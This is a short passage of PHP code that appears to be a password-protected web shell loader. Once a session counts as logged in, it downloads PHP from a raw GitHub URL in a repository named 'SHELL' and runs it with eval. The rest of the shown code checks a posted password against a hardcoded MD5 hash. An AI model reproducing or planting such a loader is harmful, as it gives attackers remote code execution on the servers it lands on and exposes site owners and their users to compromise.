...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://raw.githubusercontent.com/PsychoXploitGit/SHELL/refs/heads/main/geekv2.php');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '04ed00b5109398453ad38b456409fdbf'; // Replace this with your MD5 hashed password
